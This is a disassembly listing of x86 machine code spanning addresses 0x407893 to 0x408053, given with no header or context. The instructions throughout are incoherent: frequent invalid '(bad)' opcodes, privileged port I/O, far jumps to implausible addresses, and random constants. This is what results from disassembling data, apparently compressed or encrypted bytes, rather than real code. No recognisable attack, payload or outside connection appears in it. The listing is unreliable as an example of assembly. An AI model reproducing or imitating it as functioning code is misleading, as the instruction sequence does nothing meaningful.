  407893:	add    al,0x2b
  407895:	imul   ebp,DWORD PTR [ebp-0x38a6d465],0x1a
  40789c:	push   ecx
  40789d:	and    BYTE PTR [ecx+0x6ed17912],dl
  4078a3:	mov    ds:0x9daff4d4,al
  4078a8:	sbb    esi,DWORD PTR [ecx-0x77]
  4078ab:	cmp    eax,0xfa893f5d
  4078b0:	int    0x3d
  4078b2:	fsubr  QWORD PTR [edi+edx*1+0x18]
  4078b6:	mov    ds:0xed2086,al
  4078bb:	adc    ch,cl
  4078bd:	cmp    al,0xfe
  4078bf:	push   ebx
  4078c0:	xchg   dl,ch
  4078c2:	mov    ch,0x66
  4078c4:	jle    0x407854
  4078c6:	icebp  
  4078c7:	sub    eax,0xf0c18148
  4078cc:	mov    cl,0x72
  4078ce:	and    ebx,DWORD PTR [ecx-0x4409c351]
  4078d4:	dec    eax
  4078d5:	adc    eax,0xf35c40fe
  4078da:	xchg   ecx,eax
  4078db:	xchg   DWORD PTR [ebx-0x45cb9849],eax
  4078e1:	test   al,0xc
  4078e3:	pop    edi
  4078e4:	cvtps2pd xmm1,xmm1
  4078e7:	es pop ebx
  4078e9:	or     esp,DWORD PTR [esi+eax*1-0x48]
  4078ed:	dec    edx
  4078ee:	jp     0x4078c7
  4078f0:	(bad)  es:[eax-0x3c]
  4078f4:	sub    al,0xdb
  4078f6:	pop    ss
  4078f7:	mov    bl,0x6f
  4078f9:	es xor eax,0x11b737d6
  4078ff:	mov    ecx,0xcfc1d160
  407904:	xchg   ecx,eax
  407905:	stos   BYTE PTR es:[edi],al
  407906:	cmp    eax,0x3517c801
  40790b:	or     al,0x0
  40790d:	popf   
  40790e:	fisubr WORD PTR [ebx+0x7d]
  407911:	sub    al,dh
  407913:	xor    al,BYTE PTR [eax-0x4ca27a89]
  407919:	dec    edx
  40791a:	fsubr  st,st(5)
  40791c:	cmp    DWORD PTR [edi],esp
  40791e:	sub    ch,BYTE PTR [esi]
  407920:	mov    edi,0x6251aabe
  407925:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407926:	arpl   WORD PTR [edx-0x5fd7cbb9],si
  40792c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40792d:	retf   0x4f62
  407930:	pop    ebp
  407931:	outs   dx,BYTE PTR gs:[esi]
  407933:	push   edx
  407934:	pop    ebx
  407935:	fsubr  DWORD PTR [eax+0x7cd03c5]
  40793b:	mov    ebx,0xf53b05b9
  407940:	not    BYTE PTR [edi+0x75f3f688]
  407946:	cld    
  407947:	mov    eax,0x8ca44ff0
  40794c:	mov    ebp,0xb43a83
  407951:	push   es
  407952:	lods   al,BYTE PTR ds:[esi]
  407953:	outs   dx,DWORD PTR ds:[esi]
  407954:	test   BYTE PTR [edi-0x44],dh
  407957:	scas   eax,DWORD PTR es:[edi]
  407958:	je     0x407944
  40795a:	iret   
  40795b:	popa   
  40795c:	mov    ecx,0x4ccd87c9
  407961:	clc    
  407962:	in     eax,0x9d
  407964:	sbb    ecx,esp
  407966:	add    esi,DWORD PTR [esi-0x7a]
  407969:	sub    ch,bl
  40796b:	shl    BYTE PTR [ebx+0x44d2782c],1
  407971:	jmp    0x40798e
  407973:	add    eax,0xc36a2410
  407978:	sar    cl,cl
  40797a:	mov    edi,0xee59e633
  40797f:	and    DWORD PTR [ebp-0x4],ebp
  407982:	or     DWORD PTR [ebx],esp
  407984:	push   esi
  407985:	aam    0x54
  407987:	shl    DWORD PTR [ebx-0x14],0xe4
  40798b:	cs inc ecx
  40798d:	cwde   
  40798e:	push   edx
  40798f:	add    DWORD PTR ds:0x9667d2ba,ecx
  407995:	sub    BYTE PTR [edi+0x6d],ch
  407998:	jae    0x407992
  40799a:	(bad)  [eax-0x14d75b0e]
  4079a0:	xor    BYTE PTR [edi+ebx*8-0x6b],bl
  4079a4:	inc    edx
  4079a5:	aam    0x93
  4079a7:	shl    BYTE PTR [ecx-0x1f],1
  4079aa:	lock sbb eax,0x3975a812
  4079b0:	stos   DWORD PTR es:[edi],eax
  4079b1:	or     bh,dl
  4079b3:	maxps  xmm3,XMMWORD PTR [ebx+0xe6b90c7]
  4079ba:	sti    
  4079bb:	sbb    eax,0x8bfaf1ad
  4079c0:	scas   al,BYTE PTR es:[edi]
  4079c1:	in     al,dx
  4079c2:	nop
  4079c3:	pop    ebx
  4079c4:	dec    esi
  4079c5:	arpl   bp,ax
  4079c7:	adc    BYTE PTR [eax],ah
  4079c9:	lahf   
  4079ca:	mov    edx,0xc51eaf63
  4079cf:	ret    
  4079d0:	outs   dx,DWORD PTR ds:[esi]
  4079d1:	pop    ebx
  4079d2:	mov    ?,edi
  4079d4:	into   
  4079d5:	fcmovbe st,st(3)
  4079d7:	imul   eax,DWORD PTR [ebp+0x2e],0x3527196e
  4079de:	stc    
  4079df:	inc    ebx
  4079e0:	add    al,0x3b
  4079e2:	mov    al,0x9b
  4079e4:	inc    eax
  4079e5:	adc    BYTE PTR [edx+0x6aa14e5a],bl
  4079eb:	dec    ecx
  4079ec:	retf   0x9ca5
  4079ef:	hlt    
  4079f0:	retf   
  4079f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079f2:	fadd   QWORD PTR [edi]
  4079f4:	inc    ebp
  4079f5:	bound  edx,QWORD PTR [eax-0x6afb1705]
  4079fb:	push   eax
  4079fc:	cmp    esi,DWORD PTR [ebx]
  4079fe:	mov    DWORD PTR [edx-0x4697af07],edx
  407a04:	add    DWORD PTR [esi],0xffffffc8
  407a07:	jne    0x4079a5
  407a09:	call   0xc4a3a46c
  407a0e:	jb     0x407a7e
  407a10:	xchg   ebx,esi
  407a12:	add    al,0xf9
  407a14:	repz imul ebp,DWORD PTR [esp+ecx*8],0x600999d4
  407a1c:	sub    eax,0xa75f41a8
  407a21:	cmp    esp,ebp
  407a23:	pushf  
  407a24:	idiv   DWORD PTR [ecx]
  407a26:	(bad)  
  407a27:	push   eax
  407a28:	inc    edx
  407a29:	ficom  WORD PTR ds:0xc4d2a42d
  407a2f:	ins    DWORD PTR es:[edi],dx
  407a30:	and    eax,0x3f8a0e5e
  407a35:	addr16 xchg ecx,eax
  407a37:	inc    ebp
  407a38:	push   cs
  407a39:	or     edx,ebp
  407a3b:	shl    DWORD PTR [ebx-0x3],cl
  407a3e:	push   esp
  407a3f:	std    
  407a40:	mov    ecx,0xe9d89c28
  407a45:	mov    al,ds:0xcf819fcf
  407a4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a4b:	aas    
  407a4c:	into   
  407a4d:	jbe    0x407a7e
  407a4f:	cld    
  407a50:	cmp    al,0x76
  407a52:	pop    eax
  407a53:	sbb    BYTE PTR [edx-0x20],dh
  407a56:	inc    eax
  407a57:	test   DWORD PTR [ebp-0x4469912e],ebp
  407a5d:	sbb    eax,0xd741e810
  407a62:	pushf  
  407a63:	outs   dx,BYTE PTR ds:[esi]
  407a64:	add    eax,0xb4dd7759
  407a69:	retf   0xa1b1
  407a6c:	enter  0xde5a,0x77
  407a70:	sub    eax,0x90e54528
  407a75:	xchg   ebp,eax
  407a76:	in     al,0x92
  407a78:	jns    0x407ab1
  407a7a:	mov    ebx,0x40c15c66
  407a7f:	lods   al,BYTE PTR ds:[esi]
  407a80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a81:	push   cs
  407a82:	push   0xa2c4727c
  407a87:	mov    ecx,0xa6bcda1d
  407a8c:	jbe    0x407a83
  407a8e:	aad    0x24
  407a90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a91:	out    0xf1,eax
  407a93:	jo     0x407ace
  407a95:	loop   0x407aa8
  407a97:	jmp    0x407ab5
  407a99:	cbw    
  407a9b:	xchg   ebp,eax
  407a9c:	jae    0x407a86
  407a9e:	aaa    
  407a9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407aa0:	fistp  WORD PTR [esi+0x7fbf78a5]
  407aa6:	mov    esi,0xc07d7229
  407aab:	(bad)  
  407aac:	xchg   esi,eax
  407aad:	xchg   edx,eax
  407aae:	or     DWORD PTR [esp+edx*2],ecx
  407ab1:	xchg   ebx,eax
  407ab2:	mov    edx,0xede49f25
  407ab7:	popa   
  407ab8:	sbb    DWORD PTR [ebx+ebp*2-0x3428fcbf],esp
  407abf:	stos   DWORD PTR es:[edi],eax
  407ac0:	xlat   BYTE PTR ds:[ebx]
  407ac1:	mov    ebx,0x970b4fa4
  407ac6:	arpl   WORD PTR [esp+edi*2+0x54696f79],dx
  407acd:	mov    ch,0x4c
  407acf:	sub    eax,0x65e0f715
  407ad4:	add    ebx,DWORD PTR [ebp-0x3b]
  407ad7:	cmp    ecx,DWORD PTR [eax+0x58]
  407ada:	dec    ebx
  407adb:	add    esi,eax
  407add:	sbb    dh,BYTE PTR [esi]
  407adf:	push   ebp
  407ae0:	mov    BYTE PTR [edx+0x2c],al
  407ae3:	es inc esp
  407ae5:	fst    QWORD PTR [eax]
  407ae7:	stos   DWORD PTR es:[edi],eax
  407ae8:	mov    dh,0x76
  407aea:	xor    al,0x46
  407aec:	push   cs
  407aed:	mov    ecx,0xb56b5b30
  407af2:	mov    gs,ebp
  407af4:	arpl   WORD PTR [edi],si
  407af6:	push   edi
  407af7:	loope  0x407b24
  407af9:	mov    eax,0xb1741ddb
  407afe:	xor    BYTE PTR [edi],0x3e
  407b01:	(bad)  [ecx-0x5e]
  407b04:	in     eax,0x6c
  407b06:	(bad)  
  407b07:	repz std 
  407b09:	lds    edx,FWORD PTR [eax]
  407b0b:	xor    DWORD PTR [edi+0x3d],ebp
  407b0e:	in     al,dx
  407b0f:	sbb    esi,edi
  407b11:	mov    cl,0x7e
  407b13:	dec    esp
  407b14:	in     al,0x66
  407b16:	mov    dl,0x41
  407b18:	repnz push ds
  407b1a:	jecxz  0x407b79
  407b1c:	and    eax,0x87a445e4
  407b21:	fistp  DWORD PTR [ebx-0x3e495389]
  407b27:	mov    ds:0x90eca6e3,al
  407b2c:	repz rol BYTE PTR [edx-0x38],1
  407b30:	imul   edi,DWORD PTR [edx+0x4f545d46],0x27
  407b37:	mov    edi,DWORD PTR [ebx-0x35924cb3]
  407b3d:	dec    ecx
  407b3e:	loop   0x407b05
  407b40:	add    al,0xe7
  407b42:	mov    ebx,0xc761675b
  407b47:	popf   
  407b48:	push   es
  407b49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b4a:	adc    al,0xa5
  407b4c:	into   
  407b4d:	xor    BYTE PTR ds:0x28f57872,ah
  407b53:	mov    DWORD PTR [edi],esi
  407b55:	and    esi,esi
  407b57:	mov    ds:0xd7a6511c,al
  407b5c:	mov    esp,0x651bcba1
  407b61:	pop    esi
  407b62:	int3   
  407b63:	dec    ebp
  407b64:	cmp    al,0xa
  407b66:	xchg   edx,eax
  407b67:	scas   al,BYTE PTR es:[edi]
  407b68:	(bad)  
  407b69:	adc    ecx,edx
  407b6b:	setp   BYTE PTR [edx]
  407b6e:	popf   
  407b6f:	data16 outs dx,BYTE PTR ds:[esi]
  407b71:	adc    eax,0xecca3b9a
  407b76:	jmp    0xc871203d
  407b7b:	fdivr  QWORD PTR [esi]
  407b7d:	push   esi
  407b7e:	or     edx,DWORD PTR [eax-0x4b2906e9]
  407b84:	(bad)  
  407b85:	cdq    
  407b86:	adc    DWORD PTR [edi+0x58],edx
  407b89:	jne    0x407b9b
  407b8b:	xlat   BYTE PTR ds:[bx]
  407b8d:	retf   
  407b8e:	mov    DWORD PTR [eax+0x700b2899],edi
  407b94:	ja     0x407b5b
  407b96:	(bad)  
  407b97:	jno    0x407be4
  407b99:	push   ebp
  407b9a:	fld    QWORD PTR [ebx+0x50]
  407b9d:	jmp    0x346b:0x2fb52692
  407ba4:	loopne 0x407b61
  407ba6:	xor    al,0x54
  407ba8:	hlt    
  407ba9:	or     al,BYTE PTR [eax-0x22]
  407bac:	jmp    0x79be0847
  407bb1:	inc    esi
  407bb2:	xor    al,0x6c
  407bb4:	lods   eax,DWORD PTR ds:[esi]
  407bb5:	and    BYTE PTR [edi+0x2b4543b1],0x70
  407bbc:	outs   dx,DWORD PTR ds:[esi]
  407bbd:	popa   
  407bbe:	rcr    bh,1
  407bc0:	mov    ebp,0xff5ccb84
  407bc5:	out    dx,eax
  407bc6:	cs das 
  407bc8:	jge    0x407b79
  407bca:	leave  
  407bcb:	loope  0x407bfc
  407bcd:	push   esp
  407bce:	dec    ebp
  407bcf:	push   es
  407bd0:	add    BYTE PTR [esi+ebx*1],0x1f
  407bd4:	nop
  407bd5:	jecxz  0x407bc6
  407bd7:	das    
  407bd8:	pusha  
  407bd9:	stc    
  407bda:	and    al,BYTE PTR [esi]
  407bdc:	inc    esp
  407bdd:	sbb    eax,0xe038ee46
  407be2:	dec    DWORD PTR [ebx]
  407be4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407be5:	arpl   WORD PTR [edx*4+0x502adc67],dx
  407bec:	pop    ds
  407bed:	jb     0x407c3c
  407bef:	and    al,0x61
  407bf1:	lahf   
  407bf2:	cmp    BYTE PTR [ebx+ebp*4],0xb6
  407bf6:	mov    WORD PTR [ebp+0x23a0e499],fs
  407bfc:	aam    0x65
  407bfe:	cli    
  407bff:	add    eax,0x732cb8fd
  407c04:	gs dec esi
  407c06:	push   edi
  407c07:	push   es
  407c08:	cmp    al,0xa0
  407c0a:	loop   0x407c76
  407c0c:	retf   
  407c0d:	fadd   DWORD PTR [ebx-0x56]
  407c10:	mov    ds:0x600e5f3b,eax
  407c15:	sbb    BYTE PTR [edx+0x773749ae],0x35
  407c1c:	retf   
  407c1d:	jle    0x407b9f
  407c1f:	mov    bh,0x1
  407c21:	(bad)  [ebp+ecx*4-0xd]
  407c25:	fwait
  407c26:	adc    DWORD PTR [eax-0x29],esp
  407c29:	mov    ecx,0x8abef865
  407c2e:	aam    0x6a
  407c30:	ins    BYTE PTR es:[di],dx
  407c32:	imul   edx,DWORD PTR [ebx-0x1e],0x25356a21
  407c39:	dec    esi
  407c3a:	ss add eax,0xf87f7009
  407c40:	xchg   esi,eax
  407c41:	sub    al,0xec
  407c43:	jmp    0x407c43
  407c45:	pushf  
  407c46:	(bad)  
  407c47:	jge    0x407c35
  407c49:	dec    esp
  407c4a:	jmp    0x3083aa7d
  407c4f:	mov    edx,0xe7589383
  407c54:	sbb    al,0xb9
  407c56:	fldcw  WORD PTR [eax+0x47]
  407c59:	add    BYTE PTR [esi-0x32],bh
  407c5c:	inc    edi
  407c5d:	pop    ss
  407c5e:	test   al,0xf0
  407c60:	not    BYTE PTR [eax+0x3c]
  407c63:	cli    
  407c64:	inc    edx
  407c65:	push   cs
  407c66:	sbb    eax,esp
  407c68:	dec    edi
  407c69:	cdq    
  407c6a:	pop    edx
  407c6b:	jns    0x407cc0
  407c6d:	scas   eax,DWORD PTR es:[edi]
  407c6e:	and    DWORD PTR [ebx-0x6c],esi
  407c71:	mov    ah,0xdc
  407c73:	mov    dl,0xe9
  407c75:	xchg   esi,eax
  407c76:	xor    DWORD PTR [ebx+0x50476c2e],edi
  407c7c:	(bad)  
  407c7d:	cmp    DWORD PTR [ebp+0x1260d6c6],esp
  407c83:	and    dl,BYTE PTR [ebx+eax*1]
  407c86:	aam    0x89
  407c88:	das    
  407c89:	leave  
  407c8a:	xchg   esp,eax
  407c8b:	dec    ebx
  407c8c:	(bad)  
  407c8d:	push   ecx
  407c8e:	xchg   edi,eax
  407c8f:	(bad)  
  407c90:	jp     0x407c30
  407c92:	hlt    
  407c93:	mov    es,WORD PTR ds:0x3cbf231a
  407c99:	cmp    dh,BYTE PTR [ecx]
  407c9b:	bound  ebx,QWORD PTR [edi-0x45e53e30]
  407ca1:	in     eax,dx
  407ca2:	cwde   
  407ca3:	sar    BYTE PTR [ebx],0x88
  407ca6:	jle    0x407cf8
  407ca8:	js     0x407d06
  407caa:	pop    ds
  407cab:	mov    esi,0xe6d85c46
  407cb0:	imul   ecx,ecx,0xa80759a2
  407cb6:	stos   DWORD PTR es:[edi],eax
  407cb7:	mov    ds:0x7a04f3ef,al
  407cbc:	jmp    0x407c86
  407cbe:	dec    esp
  407cbf:	adc    ch,BYTE PTR [edx]
  407cc1:	jmp    0x407cd3
  407cc3:	or     ah,0x2a
  407cc6:	bnd jmp 0x407d25
  407cc9:	push   0x9816500f
  407cce:	dec    edi
  407ccf:	push   ecx
  407cd0:	and    BYTE PTR [ebx],al
  407cd2:	call   0x6e27:0x49d0f5ef
  407cd9:	in     eax,0xe8
  407cdb:	and    al,0x7
  407cdd:	call   0xdd85c769
  407ce2:	xor    ch,BYTE PTR [eax-0x7f]
  407ce5:	push   esp
  407ce6:	xchg   ebx,eax
  407ce7:	or     DWORD PTR [bp+si-0x2a],edi
  407ceb:	sbb    eax,0xddf7f0a8
  407cf0:	(bad)  
  407cf2:	pop    eax
  407cf3:	aas    
  407cf4:	jp     0x407cbf
  407cf6:	cmp    dl,BYTE PTR [ebp-0x47780034]
  407cfc:	mov    ebp,0x588df532
  407d01:	std    
  407d02:	les    edx,FWORD PTR [ebp+0x30]
  407d05:	or     al,0xaf
  407d07:	jecxz  0x407cfa
  407d09:	xor    dh,BYTE PTR [edx-0x51e82ff0]
  407d0f:	shl    BYTE PTR [ecx+0x4cd08515],1
  407d15:	xchg   DWORD PTR [eax],edx
  407d17:	or     BYTE PTR [edi-0x4],0xb1
  407d1b:	loope  0x407d86
  407d1d:	adc    eax,DWORD PTR [ebx]
  407d1f:	sbb    ch,BYTE PTR [edx-0x2f]
  407d22:	xlat   BYTE PTR ds:[ebx]
  407d23:	mov    al,ds:0x1280307c
  407d28:	cmp    bl,BYTE PTR [esi]
  407d2a:	pusha  
  407d2b:	rcl    BYTE PTR [edx+0x7772e497],0x74
  407d32:	int3   
  407d33:	lds    edi,FWORD PTR gs:[esi+0x21]
  407d37:	(bad)  
  407d39:	(bad)  
  407d3a:	ins    DWORD PTR es:[edi],dx
  407d3b:	in     eax,dx
  407d3c:	cmp    al,0x2a
  407d3e:	retf   0x470e
  407d41:	(bad)  
  407d42:	daa    
  407d43:	cmp    eax,0xc494d635
  407d48:	retf   0xa210
  407d4b:	loope  0x407d20
  407d4d:	scas   al,BYTE PTR es:[di]
  407d4f:	jecxz  0x407da6
  407d51:	or     eax,0x319c8591
  407d56:	pop    eax
  407d57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d58:	shr    DWORD PTR [esi-0x47],cl
  407d5b:	stc    
  407d5c:	shl    DWORD PTR [esi-0x5f],cl
  407d5f:	and    cl,BYTE PTR [ebx-0x6e8f4dd7]
  407d65:	xchg   ebp,eax
  407d66:	add    eax,0x800a9390
  407d6b:	xchg   edx,eax
  407d6c:	jnp    0x407d9f
  407d6e:	pop    DWORD PTR [ebp-0x3f]
  407d71:	stos   DWORD PTR es:[edi],eax
  407d72:	mov    eax,0xf72b3335
  407d77:	sbb    BYTE PTR [esi+0x1a],bh
  407d7a:	inc    edi
  407d7b:	lock pop edi
  407d7d:	xchg   DWORD PTR [ebx],edi
  407d7f:	sub    DWORD PTR [edi-0x47],ebp
  407d82:	clc    
  407d83:	(bad)  
  407d84:	dec    eax
  407d85:	dec    ecx
  407d86:	sahf   
  407d87:	and    al,0x8b
  407d89:	cwde   
  407d8a:	ret    
  407d8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d8c:	sar    DWORD PTR [ecx+0x64dea5fa],cl
  407d92:	lds    edi,FWORD PTR [eax+0x0]
  407d95:	(bad)  
  407d96:	das    
  407d97:	push   0xef75279b
  407d9c:	push   es
  407d9d:	test   BYTE PTR [esi],bl
  407d9f:	sti    
  407da0:	jp     0x407d89
  407da2:	lahf   
  407da3:	jne    0x407e1b
  407da5:	nop
  407da6:	cdq    
  407da7:	sub    eax,0xc21b6476
  407dac:	mov    ecx,0xf6e45719
  407db1:	inc    eax
  407db2:	pop    ebp
  407db3:	inc    edi
  407db4:	jae    0x407da2
  407db6:	mov    ds:0x998856c,al
  407dbb:	mov    cl,ah
  407dbd:	and    ch,ah
  407dbf:	out    dx,al
  407dc0:	inc    esi
  407dc1:	add    eax,0xd5fad4b4
  407dc6:	es xor esi,eax
  407dc9:	mov    ds:0x633778d2,eax
  407dce:	or     eax,0x4dd5ded
  407dd3:	call   0xceea2ae6
  407dd8:	test   BYTE PTR [edi],cl
  407dda:	cmp    DWORD PTR [ebx+0x27],ebx
  407ddd:	push   edi
  407dde:	loopne 0x407e44
  407de0:	and    BYTE PTR [edx-0x24],bh
  407de3:	imul   esp,DWORD PTR [ecx],0x335aa93c
  407de9:	pop    ecx
  407dea:	je     0x407dd1
  407dec:	test   eax,0x69540473
  407df1:	popf   
  407df2:	shr    DWORD PTR [ebx+0x20],0x35
  407df6:	jae    0x407e28
  407df8:	xlat   BYTE PTR ds:[ebx]
  407df9:	sbb    BYTE PTR [esi],dh
  407dfb:	adc    edi,DWORD PTR [ecx]
  407dfd:	xchg   ecx,eax
  407dfe:	loope  0x407e21
  407e00:	dec    DWORD PTR [edx+eiz*2-0x27]
  407e04:	outs   dx,BYTE PTR ds:[esi]
  407e05:	jge    0x407e77
  407e07:	push   0x38bfbeac
  407e0c:	sub    edx,esi
  407e0e:	sub    BYTE PTR [edi+0x37e81c6a],al
  407e14:	mov    cl,0xcf
  407e16:	xor    eax,DWORD PTR [edx-0x49ead08e]
  407e1c:	xor    edi,eax
  407e1e:	xor    eax,0x2376044e
  407e23:	out    dx,eax
  407e24:	add    eax,0x945a78ec
  407e29:	enter  0x8bd6,0xc
  407e2d:	inc    ecx
  407e2e:	ss pop ds
  407e30:	ret    
  407e31:	(bad)  
  407e32:	repz xchg ecx,esp
  407e35:	cs xchg edx,eax
  407e37:	(bad)  ds:0xbcc9dff8
  407e3d:	ins    DWORD PTR es:[edi],dx
  407e3e:	sub    BYTE PTR [ebp+ebx*8+0x1d],0x8f
  407e43:	add    al,0x7
  407e45:	xchg   edi,eax
  407e46:	pop    ebp
  407e47:	inc    eax
  407e48:	xchg   ebx,eax
  407e49:	pop    edx
  407e4a:	ret    
  407e4b:	popf   
  407e4c:	rcr    DWORD PTR [ebx+ebx*2-0x18b68e4d],1
  407e53:	dec    ecx
  407e54:	jo     0x407ea3
  407e56:	pushf  
  407e57:	mov    ss,WORD PTR [eax+0x65]
  407e5a:	mov    ds:0x99cb699c,eax
  407e5f:	add    esp,DWORD PTR [eax-0x787071ed]
  407e65:	dec    ebp
  407e66:	shl    BYTE PTR [eax+esi*4+0x7c],1
  407e6a:	fsub   st,st(5)
  407e6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e6d:	out    0xe3,al
  407e6f:	jb     0x407e8b
  407e71:	aam    0x8
  407e73:	cmp    eax,0x96381776
  407e78:	mov    BYTE PTR [ecx+0x4a],bl
  407e7b:	sub    bl,BYTE PTR [eax+eiz*4]
  407e7e:	xchg   ebp,eax
  407e7f:	mov    eax,0xda4dfa81
  407e84:	xchg   esp,eax
  407e85:	dec    esp
  407e86:	or     BYTE PTR [esi],al
  407e88:	test   BYTE PTR [eax+esi*8-0xea81637],al
  407e8f:	es enter 0x6976,0x51
  407e94:	and    BYTE PTR [esi-0x4c],bh
  407e97:	inc    edi
  407e98:	loopne 0x407e9d
  407e9a:	pop    ecx
  407e9b:	out    dx,eax
  407e9c:	mov    BYTE PTR [ecx+0x1d9c8997],ah
  407ea2:	test   al,0xd1
  407ea4:	add    ch,cl
  407ea6:	stos   DWORD PTR es:[edi],eax
  407ea7:	push   ss
  407ea8:	mov    esp,0x4f410c07
  407ead:	add    eax,esi
  407eaf:	ficomp DWORD PTR [esi+0x4c]
  407eb2:	sub    ah,BYTE PTR [edx+0x21]
  407eb5:	(bad)  
  407eb6:	push   eax
  407eb7:	iret   
  407eb8:	sti    
  407eb9:	loop   0x407ef6
  407ebb:	fcom   QWORD PTR [ebx]
  407ebd:	cmp    DWORD PTR [ebx+0x7bcb564b],edx
  407ec3:	jp     0x407f15
  407ec5:	mov    eax,edi
  407ec7:	cld    
  407ec8:	push   edx
  407ec9:	repz shl BYTE PTR ds:0xbb483e9b,1
  407ed0:	pop    ebx
  407ed1:	shl    DWORD PTR [ecx+0x25],0x17
  407ed5:	ss mov al,dh
  407ed8:	aaa    
  407ed9:	dec    edx
  407eda:	ss cmp eax,0x643b75aa
  407ee0:	add    al,0xfd
  407ee2:	mov    bh,cl
  407ee4:	aaa    
  407ee5:	fisttp QWORD PTR [ebp+0x780bfc3]
  407eeb:	adc    DWORD PTR [edx+0x61],ebp
  407eee:	xchg   ebp,eax
  407eef:	cld    
  407ef0:	mov    eax,0xecb0dbab
  407ef5:	xchg   ecx,eax
  407ef6:	out    0x1f,al
  407ef8:	xor    BYTE PTR [edx],bh
  407efa:	cmp    al,0xb9
  407efc:	gs out dx,eax
  407efe:	jmp    0x426c78d6
  407f03:	sti    
  407f04:	xor    BYTE PTR [edi+esi*4],0x10
  407f08:	ds xlat BYTE PTR gs:[ebx]
  407f0b:	dec    ebx
  407f0c:	add    bl,cl
  407f0e:	popa   
  407f0f:	fstp   DWORD PTR [esi]
  407f11:	arpl   WORD PTR [ebp+eiz*2-0x515dce78],si
  407f18:	je     0x407ea6
  407f1a:	aaa    
  407f1b:	pop    esi
  407f1c:	fstp   TBYTE PTR [ebp+0x40]
  407f1f:	dec    ecx
  407f20:	mov    bl,0x84
  407f22:	sbb    eax,0x58bbbc88
  407f27:	scas   eax,DWORD PTR es:[edi]
  407f28:	inc    esi
  407f29:	mov    edi,0x2bd4a506
  407f2e:	in     al,dx
  407f2f:	mov    ebx,0xa7de8be9
  407f34:	or     BYTE PTR [ebx-0x41],ch
  407f37:	ret    
  407f38:	sbb    esp,DWORD PTR [eax+edx*8+0x30]
  407f3c:	mov    dl,0xd0
  407f3e:	ror    BYTE PTR [edx-0x4be1654a],cl
  407f44:	lods   eax,DWORD PTR ds:[esi]
  407f45:	jp     0x407f8f
  407f47:	and    eax,0xb5daca8e
  407f4c:	loope  0x407f2a
  407f4e:	adc    BYTE PTR [edi],al
  407f50:	pop    esi
  407f51:	push   0x38
  407f53:	sar    DWORD PTR [edx-0x30b509ba],0x45
  407f5a:	hlt    
  407f5b:	and    eax,0x7a174886
  407f60:	aam    0x41
  407f62:	int3   
  407f63:	mov    edx,0xcc6f57c4
  407f68:	std    
  407f69:	jge    0x407f77
  407f6b:	cmp    eax,0x4dfb7311
  407f70:	in     eax,0x64
  407f72:	xor    BYTE PTR [edi],cl
  407f74:	add    esi,DWORD PTR [eax+0x5c]
  407f77:	nop
  407f78:	sbb    esp,DWORD PTR [ecx-0xe661e20]
  407f7e:	lods   al,BYTE PTR ds:[esi]
  407f7f:	mov    esi,0xcb9462c1
  407f84:	in     eax,dx
  407f85:	cli    
  407f86:	cmp    eax,0x856eaa88
  407f8b:	push   ecx
  407f8c:	loop   0x407f3e
  407f8e:	mov    eax,0xcd3189f5
  407f93:	push   ebp
  407f94:	shl    BYTE PTR [eax+0x63],0x5b
  407f98:	mov    ebp,0xb5c1d8d0
  407f9d:	into   
  407f9e:	in     al,0x57
  407fa0:	xor    bl,BYTE PTR [ebx+0x3d833fc1]
  407fa6:	push   cs
  407fa7:	gs mov ch,0xdb
  407faa:	and    al,dh
  407fac:	stos   DWORD PTR es:[edi],eax
  407fad:	neg    DWORD PTR [edi+0x32c824f8]
  407fb3:	aas    
  407fb4:	xor    al,0xbd
  407fb6:	cli    
  407fb7:	imul   ecx,edx,0xe
  407fba:	mov    bl,0xb7
  407fbc:	sahf   
  407fbd:	push   0x16
  407fbf:	test   BYTE PTR [ecx+0x3250cdb3],0xb0
  407fc6:	adc    BYTE PTR [ecx+0xa],ah
  407fc9:	dec    esi
  407fca:	add    al,ah
  407fcc:	mov    al,0x7c
  407fce:	imul   edi,DWORD PTR [edx],0x24f96bd2
  407fd4:	mov    eax,ds:0x29d57a01
  407fd9:	out    0xe7,eax
  407fdb:	inc    BYTE PTR [eax]
  407fdd:	lods   eax,DWORD PTR es:[esi]
  407fdf:	mov    gs,WORD PTR [ebx-0x734aa388]
  407fe5:	or     DWORD PTR [ebp+0x6623a43a],ebp
  407feb:	jno    0x40804f
  407fed:	dec    ecx
  407fee:	mov    eax,0x340adf20
  407ff3:	inc    ecx
  407ff4:	xchg   ecx,eax
  407ff5:	adc    ebp,DWORD PTR [ebp+0x2fa7d93a]
  407ffb:	and    eax,0xd3c3762d
  408000:	dec    ebx
  408001:	es into 
  408003:	adc    dl,BYTE PTR [edx+0x36]
  408006:	cmc    
  408007:	mov    eax,ds:0x5d6704f6
  40800c:	retf   0x87cd
  40800f:	loope  0x407ff2
  408011:	cdq    
  408012:	and    BYTE PTR [esi-0x51],0xce
  408016:	mov    fs,ebx
  408018:	jo     0x40802e
  40801a:	and    bh,BYTE PTR [eax-0x25]
  40801d:	xor    DWORD PTR [esi],esp
  40801f:	push   eax
  408020:	xchg   edi,eax
  408021:	sar    WORD PTR [edi],cl
  408024:	inc    ebp
  408025:	adc    eax,edi
  408027:	adc    al,0x85
  408029:	pusha  
  40802a:	nop
  40802b:	inc    ecx
  40802c:	xchg   edx,eax
  40802d:	and    eax,DWORD PTR [eax+esi*8]
  408030:	sub    DWORD PTR [edi-0x5c933576],ebx
  408036:	bound  esp,QWORD PTR ss:[edi]
  408039:	sbb    eax,0xda27e81d
  40803e:	mov    eax,ds:0x25e1c895
  408043:	lods   eax,DWORD PTR ds:[esi]
  408044:	sub    dl,bl
  408046:	add    dh,BYTE PTR [ebx+ebp*4-0x1f]
  40804a:	push   ebx
  40804b:	std    
  40804c:	mov    bh,BYTE PTR [edi+0x5a03bdd2]
  408052:	xchg   edx,eax
  408053:	cmpps  xmm1,xmm7,0xa9
